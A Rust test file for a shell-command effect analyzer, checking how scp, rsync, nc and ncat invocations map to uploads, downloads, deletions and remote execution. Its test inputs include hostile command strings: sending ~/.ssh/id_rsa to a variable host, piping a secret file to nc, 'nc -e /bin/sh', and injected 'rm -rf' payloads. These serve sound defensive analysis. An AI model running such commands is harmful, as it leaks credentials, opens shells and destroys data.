//! Transfer model tests for symbolic remote and ambiguous operands.

use effinterp_engine::{Engine, TransferBinding};
use effinterp_proto::{
    AttrValue, BoundaryClass, CoverageLevel, Domain, Effect, ExecutionRealm, Plan, ResourceExpr,
    ResourceFamily, ResourceIdentity, Subject, validate_plan,
};

#[test]
fn transfer_binding_serialization_preserves_assurance() {
    let exact = TransferBinding::exact(2, 7);
    let encoded = serde_json::to_string(&exact).unwrap();
    let decoded: TransferBinding = serde_json::from_str(&encoded).unwrap();
    assert_eq!(decoded, exact);
    assert_eq!(exact.shifted(3).assurance, exact.assurance);
    assert_eq!(
        TransferBinding::new(2, 7).assurance,
        effinterp_proto::CausalAssurance::Conservative
    );
}

fn exec(argv: &[&str]) -> Plan {
    checked_plan(Subject::Exec {
        argv: argv.iter().map(|value| value.to_string()).collect(),
        cwd: Some("/w".to_string()),
        context: Default::default(),
    })
}

fn shell(source: &str) -> Plan {
    checked_plan(Subject::Shell {
        source: source.to_string(),
        cwd: Some("/w".to_string()),
        context: Default::default(),
    })
}

fn checked_plan(subject: Subject) -> Plan {
    let plan = Engine::new().analyze(&subject).unwrap();
    validate_plan(&plan).unwrap_or_else(|error| panic!("invalid plan for {subject:?}: {error:?}"));
    plan
}

fn effect<'a>(plan: &'a Plan, operation: &str) -> &'a Effect {
    plan.effects
        .iter()
        .find(|effect| effect.operation.0 == operation)
        .unwrap_or_else(|| panic!("missing {operation}"))
}

fn has_operation(plan: &Plan, operation: &str) -> bool {
    plan.effects
        .iter()
        .any(|effect| effect.operation.0 == operation)
}

fn symbolic_endpoint(scheme: &str, part: ResourceExpr) -> ResourceExpr {
    ResourceExpr::Join {
        parts: vec![
            ResourceExpr::Literal {
                value: format!("{scheme}://"),
            },
            part,
        ],
    }
}

#[test]
fn scp_symbolic_host_uploads_without_a_phantom_local_write() {
    let plan = shell("scp f user@$HOST:/tmp/");
    assert_eq!(
        effect(&plan, "network.upload").resource,
        symbolic_endpoint(
            "ssh",
            ResourceExpr::Environment {
                name: "HOST".into(),
            },
        )
    );
    assert!(!has_operation(&plan, "filesystem.write"));
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unresolved_transfer_target")
    );
    assert_eq!(
        plan.coverage
            .0
            .get(&Domain::new("filesystem"))
            .map(|claim| &claim.level),
        Some(&CoverageLevel::Full)
    );
    assert_eq!(
        plan.coverage
            .0
            .get(&Domain::new("network"))
            .map(|claim| &claim.level),
        Some(&CoverageLevel::Full)
    );
}

#[test]
fn scp_multiple_symbolic_remote_sources_download_to_one_local_path() {
    let plan = shell("scp user@$HOST:/etc/a user@$HOST:/etc/b ./out");
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "network.download")
            .count(),
        2
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.write"
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == "/w/out"
            )
    }));
    assert!(!plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.read"
            && matches!(&effect.resource, ResourceExpr::Join { parts } if parts.iter().any(|part| matches!(part, ResourceExpr::Environment { name } if name == "HOST")))
    }));
}

#[test]
fn scp_literal_host_with_symbolic_path_keeps_the_concrete_endpoint() {
    let plan = shell("scp f host:$P");
    assert!(matches!(
        &effect(&plan, "network.upload").resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::NetworkEndpoint {
                host,
                scheme: Some(scheme),
                port: None,
                path: None,
            }
        } if host == "host" && scheme == "ssh"
    ));
    assert!(!has_operation(&plan, "filesystem.write"));
}

#[test]
fn transfer_symbolic_host_forms_keep_their_schemes() {
    let scp = shell("scp f \"$HOST:/p\"");
    assert_eq!(
        effect(&scp, "network.upload").resource,
        symbolic_endpoint(
            "ssh",
            ResourceExpr::Environment {
                name: "HOST".into(),
            },
        )
    );

    let rsync = shell("rsync -e ssh ./dir rsync://$HOST/mod/");
    assert_eq!(
        effect(&rsync, "network.upload").resource,
        symbolic_endpoint(
            "rsync",
            ResourceExpr::Environment {
                name: "HOST".into(),
            },
        )
    );
}

#[test]
fn command_substitution_host_is_a_symbolic_remote_endpoint() {
    let plan = shell("rsync ./dir $(get_host):/srv/");
    assert_eq!(
        effect(&plan, "network.upload").resource,
        symbolic_endpoint(
            "ssh",
            ResourceExpr::Unresolved {
                family: ResourceFamily::new("network"),
            },
        )
    );
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unmodeled_command")
    );
}

#[test]
fn rsync_delete_marks_remote_destinations_without_local_deletion() {
    for (source, host, path) in [
        (
            "rsync -av --delete ./dir user@backup.host:/srv/",
            "user@backup.host",
            "/srv",
        ),
        (
            "rsync -a --delete /local/ backup.host:/remote/",
            "backup.host",
            "/remote",
        ),
        (
            "rsync -d --delete-before /local/ backup.host:/remote/",
            "backup.host",
            "/remote",
        ),
    ] {
        let plan = shell(source);
        assert_eq!(
            effect(&plan, "network.upload").attributes.get("delete"),
            Some(&AttrValue::Bool(true))
        );
        let delete = effect(&plan, "filesystem.delete");
        assert_eq!(
            delete.realm,
            ExecutionRealm::Remote {
                endpoint: host.into()
            }
        );
        assert_eq!(
            delete.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path: path.into() }
            }
        );
        assert_eq!(
            delete.attributes.get("contents_only"),
            Some(&AttrValue::Bool(true))
        );
        assert_eq!(delete.modality, effinterp_proto::Modality::May);
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete" && effect.realm.is_host())
        );
        assert_eq!(
            plan.effects
                .iter()
                .filter(|effect| effect.operation.0 == "process.exec")
                .count(),
            1
        );
    }
    let symbolic = shell("rsync -av --delete ./dir user@$HOST:/srv/");
    assert!(!has_operation(&symbolic, "filesystem.delete"));
    assert!(
        symbolic
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unresolved_transfer_target")
    );
    for source in [
        "rsync --delete source/ host:/dest",
        "rsync --delete source/ /dest",
        "rsync -an --delete source/ host:/dest",
        "rsync -a --dry-run --delete source/ /dest",
        "rsync -a --list-only --delete source/ host:/dest",
        "rsync -a --delete-typo source/ host:/dest",
        "rsync -a --delete=false source/ host:/dest",
        "rsync -a --delete source/",
        "rsync -a --delete --max-delete=0 source/ host:/dest",
        "rsync -a --no-recursive --delete source/ host:/dest",
        "rsync -a --files-from=list --delete source/ host:/dest",
        "rsync -a --delete --backup-dir=backup source/ host:/dest",
        "rsync -a --delete --only-write-batch=batch source/ host:/dest",
        "rsync -a --delete --read-batch=batch source/ host:/dest",
        "rsync -a --delete other:/source host:/dest",
    ] {
        let plan = shell(source);
        assert!(!has_operation(&plan, "filesystem.delete"), "{source}");
        if source.contains("dry-run") || source.contains("-an") || source.contains("list-only") {
            assert!(!has_operation(&plan, "filesystem.write"), "{source}");
        }
    }

    for source in [
        "rsync --dry-run --delete source/ /",
        "rsync -an --delete source/ /",
        "rsync --list-only --delete source/ /",
    ] {
        let plan = shell(source);
        assert!(!has_operation(&plan, "filesystem.write"), "{source}");
        assert!(!has_operation(&plan, "filesystem.delete"), "{source}");
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:#?}",
            plan.boundaries
        );
        assert_eq!(
            plan.coverage
                .0
                .get(&Domain::new("filesystem"))
                .map(|claim| &claim.level),
            Some(&CoverageLevel::Full),
            "{source}"
        );
        assert_eq!(
            effect(&plan, "filesystem.read")
                .attributes
                .get("access_purpose"),
            Some(&AttrValue::String("program_input".into())),
            "{source}"
        );
    }
}

#[test]
fn rsync_trailing_value_flags_preserve_the_destination() {
    for option in [
        "--exclude pattern",
        "--include pattern",
        "--filter pattern",
        "-f pattern",
        "--exclude=pattern",
    ] {
        for destination in ["/", "host:/dst"] {
            let plan = shell(&format!("rsync -a --delete source/ {destination} {option}"));
            assert_eq!(
                effect(&plan, "filesystem.read").resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath {
                        path: "/w/source".into()
                    },
                }
            );
            if destination == "/" {
                for operation in ["filesystem.write", "filesystem.delete"] {
                    let emitted = effect(&plan, operation);
                    assert_eq!(
                        emitted.resource,
                        ResourceExpr::Concrete {
                            identity: ResourceIdentity::FsPath { path: "/".into() },
                        }
                    );
                    // The destination side of a synchronization, the same
                    // marker a remote destination carries.
                    assert_eq!(
                        emitted.attributes.get("delete"),
                        Some(&AttrValue::Bool(true))
                    );
                }
            } else {
                assert_eq!(
                    effect(&plan, "network.upload").attributes.get("delete"),
                    Some(&AttrValue::Bool(true))
                );
                assert!(!has_operation(&plan, "network.download"));
                assert!(!has_operation(&plan, "filesystem.write"));
                assert_eq!(
                    effect(&plan, "filesystem.delete").realm,
                    ExecutionRealm::Remote {
                        endpoint: "host".into()
                    }
                );
            }
            assert!(!plan.effects.iter().any(|e| matches!(&e.resource,
                ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path.ends_with("pattern"))));
            assert!(plan.boundaries.is_empty());
        }
    }
}

#[test]
fn ambiguous_transfer_destination_is_an_upload_with_partial_coverage() {
    let plan = shell("scp f $DEST");
    assert_eq!(
        effect(&plan, "network.upload").resource,
        ResourceExpr::Environment {
            name: "DEST".into(),
        }
    );
    assert!(!has_operation(&plan, "filesystem.write"));
    let boundary = plan
        .boundaries
        .iter()
        .find(|boundary| boundary.reason.as_str() == "unresolved_transfer_target")
        .expect("unresolved transfer boundary");
    assert_eq!(boundary.class, BoundaryClass::Unresolved);
    assert_eq!(
        boundary.domains,
        vec![Domain::new("filesystem"), Domain::new("network")]
    );
    assert_eq!(boundary.affected_resource, None);
    assert_eq!(
        plan.coverage
            .0
            .get(&Domain::new("filesystem"))
            .map(|claim| &claim.level),
        Some(&CoverageLevel::Partial)
    );
    assert_eq!(
        plan.coverage
            .0
            .get(&Domain::new("network"))
            .map(|claim| &claim.level),
        Some(&CoverageLevel::Partial)
    );
}

#[test]
fn ambiguous_transfer_source_is_a_download_or_an_unknown_local_read() {
    let plan = shell("scp $SRC ./out");
    assert_eq!(
        effect(&plan, "network.download").resource,
        ResourceExpr::Environment { name: "SRC".into() }
    );
    assert!(matches!(
        effect(&plan, "filesystem.read").resource,
        ResourceExpr::Unresolved { .. }
    ));
    assert!(has_operation(&plan, "filesystem.write"));
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unresolved_transfer_target")
    );

    // A substituted host may hold a slash, so the source may be local; the
    // remote destination's upload survives it.
    for command in ["scp", "rsync"] {
        let plan = shell(&format!(
            "{command} \"$(get_host):/path\" dest.example:/tmp/"
        ));
        assert!(has_operation(&plan, "network.download"), "{command}");
        assert!(
            matches!(
                effect(&plan, "filesystem.read").resource,
                ResourceExpr::Unresolved { .. }
            ),
            "{command}"
        );
        assert!(
            matches!(
                &effect(&plan, "network.upload").resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::NetworkEndpoint { host, .. }
                } if host == "dest.example"
            ),
            "{command}"
        );
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unresolved_transfer_target"),
            "{command}"
        );
    }
}

#[test]
fn symbolic_local_transfer_operands_remain_filesystem_effects() {
    for source in ["scp f $HOME/x", "scp f ./dir/$NAME", "scp f backup-$DATE"] {
        let plan = shell(source);
        assert!(has_operation(&plan, "filesystem.write"), "{source}");
        assert!(!has_operation(&plan, "network.upload"), "{source}");
        assert!(
            !plan
                .boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unresolved_transfer_target")
        );
    }

    let home = shell("scp ~/.ssh/id_rsa user@$HOST:/tmp/");
    assert!(has_operation(&home, "filesystem.read"));
    assert!(has_operation(&home, "network.upload"));
    assert!(!home.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.write"
            && matches!(&effect.resource, ResourceExpr::Join { parts } if parts.iter().any(|part| matches!(part, ResourceExpr::Environment { name } if name == "HOST")))
    }));
}

#[test]
fn symbolic_transfer_plan_is_deterministic() {
    let first = effinterp_proto::canonical_json(&shell("scp f user@$HOST:/tmp/"));
    let second = effinterp_proto::canonical_json(&shell("scp f user@$HOST:/tmp/"));
    assert_eq!(first, second);
}

#[test]
fn rsync_path_runs_through_the_remote_login_shell() {
    let plan = shell("rsync -a --rsync-path='sudo rm -rf /x; rsync' ./s host:/d");
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.read"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == "/w/s")
    }));
    assert!(has_operation(&plan, "network.upload"));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && effect.realm
                == (ExecutionRealm::Remote {
                    endpoint: "host".to_string(),
                })
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == "/x")
    }));
}

#[test]
fn rsync_path_space_form_is_not_a_transfer_operand() {
    let plan = shell("rsync --rsync-path 'sudo rsync' ./s host:/d");
    let transfers = plan
        .effects
        .iter()
        .filter(|effect| {
            matches!(
                effect.operation.0.as_str(),
                "filesystem.read" | "filesystem.write" | "network.download" | "network.upload"
            )
        })
        .collect::<Vec<_>>();
    assert_eq!(transfers.len(), 2);
    assert!(!transfers.iter().any(|effect| {
        matches!(&effect.resource, ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        } if path.contains("sudo"))
    }));
}

#[test]
fn rsync_rsh_runs_locally_with_the_remote_host_appended() {
    let plan = shell("rsync -e 'ssh -p 2222 -i key' ./s host:/d");
    assert!(plan.execution_graph.nodes.iter().any(|node| {
        node.realm.is_host()
            && matches!(&node.subject, Subject::Exec { argv, .. }
                if argv.first().map(String::as_str) == Some("ssh")
                    && argv.iter().any(|argument| argument == "-p")
                    && argv.iter().any(|argument| argument == "2222")
                    && argv.iter().any(|argument| argument == "host"))
    }));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "network.connect"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::NetworkEndpoint { host, port: Some(2222), .. }
            } if host == "host")
    }));

    let local_shell = shell("rsync -e 'sh -c \"rm -rf /\"' ./s host:/d");
    assert!(local_shell.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && effect.realm.is_host()
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == "/")
    }));
}

#[test]
fn rsync_symbolic_rsh_is_opaque_without_losing_transfers() {
    let plan = shell("rsync -e \"$RSH\" ./s host:/d");
    assert!(has_operation(&plan, "filesystem.read"));
    assert!(has_operation(&plan, "network.upload"));
    let boundaries = plan
        .boundaries
        .iter()
        .filter(|boundary| boundary.reason.as_str() == "unrecoverable_source")
        .collect::<Vec<_>>();
    assert_eq!(boundaries.len(), 1);
    for domain in [
        "process",
        "filesystem",
        "network",
        "environment",
        "database",
    ] {
        assert!(boundaries[0].domains.contains(&Domain::new(domain)));
    }
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "process.exec")
            .count(),
        1
    );
}

#[test]
fn local_rsync_does_not_run_remote_side_options() {
    let plan = exec(&["rsync", "-a", "--rsync-path=x", "./s", "./d"]);
    assert!(
        plan.execution_graph
            .nodes
            .iter()
            .all(|node| node.realm.is_host())
    );
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "process.exec")
            .count(),
        1
    );
}

#[test]
fn socket_streams_preserve_direction_and_scans_carry_no_payload() {
    use effinterp_proto::{OccurrenceKind, Port};
    for (argv, receive, send, listen) in [
        (vec!["nc", "remote.example", "4444"], true, true, false),
        (vec!["nc", "-l", "4444"], true, true, true),
        (vec!["ncat", "--listen", "4444"], true, true, true),
        (
            vec!["ncat", "--recv-only", "remote.example", "4444"],
            true,
            false,
            false,
        ),
        (
            vec!["ncat", "--send-only", "remote.example", "4444"],
            false,
            true,
            false,
        ),
        (
            vec!["nc", "-d", "remote.example", "4444"],
            true,
            false,
            false,
        ),
        (
            vec!["nc", "-z", "remote.example", "4444"],
            false,
            false,
            false,
        ),
    ] {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: format!("cat /w/secret | {} | cat", argv.join(" ")),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert_eq!(
            has_operation(&plan, "network.download"),
            receive,
            "{argv:?}"
        );
        assert_eq!(has_operation(&plan, "network.upload"), send, "{argv:?}");
        assert!(has_operation(
            &plan,
            if listen {
                "network.listen"
            } else {
                "network.connect"
            }
        ));
        assert!(
            plan.effects
                .iter()
                .filter(|effect| effect.operation.0.starts_with("network."))
                .all(|effect| effect.modality == effinterp_proto::Modality::May)
        );
        if listen {
            assert!(matches!(
                effect(&plan, "network.download").resource,
                ResourceExpr::Unresolved { .. }
            ));
        }
        if receive || send {
            let graph = plan.causality.graph.as_ref().unwrap();
            let linked = |operation: &str, port: Port, input: bool| {
                graph.nodes.iter().filter(|node| matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation: actual, .. } if actual.0 == operation)).any(|effect| {
                    graph.nodes.iter().filter(|node| node.execution == effect.execution && matches!(&node.occurrence, OccurrenceKind::Port { port: actual } if *actual == port)).any(|port_node| {
                        let (start, target) = if input { (&port_node.id, &effect.id) } else { (&effect.id, &port_node.id) };
                        let mut seen = std::collections::BTreeSet::from([start.clone()]);
                        let mut pending = vec![start.clone()];
                        while let Some(current) = pending.pop() {
                            if &current == target { return true; }
                            for edge in graph.edges.iter().filter(|edge| edge.from == current && edge.reason == effinterp_proto::CausalReason::ValueDependency) {
                                if seen.insert(edge.to.clone()) { pending.push(edge.to.clone()); }
                            }
                        }
                        false
                    })
                })
            };
            assert_eq!(
                linked("network.download", Port::Stdout, false),
                receive,
                "{argv:?}"
            );
            assert_eq!(
                linked("network.upload", Port::Stdin, true),
                send,
                "{argv:?}"
            );
        }
    }
    for argv in [
        vec!["nc", "-h", "remote.example", "4444"],
        vec!["ncat", "--help"],
        vec!["nc", "-z", "-l", "4444"],
        vec!["nc", "-e", "/bin/sh"],
        vec!["nc", "remote.example"],
        vec!["nc", "remote.example", "bad-port"],
        vec!["nc", "-n", "remote.example", "4444"],
        vec!["ncat", "-4", "::1", "4444"],
        vec!["nc", "-6", "127.0.0.1", "4444"],
        vec!["ncat", "--recv-only=false", "remote.example", "4444"],
        vec!["ncat", "--made-up", "remote.example", "4444"],
    ] {
        let plan = exec(&argv);
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0.starts_with("network.")),
            "{argv:?}"
        );
        assert_eq!(
            plan.effects
                .iter()
                .filter(|effect| effect.operation.0 == "process.exec")
                .count(),
            1,
            "{argv:?}"
        );
    }
}
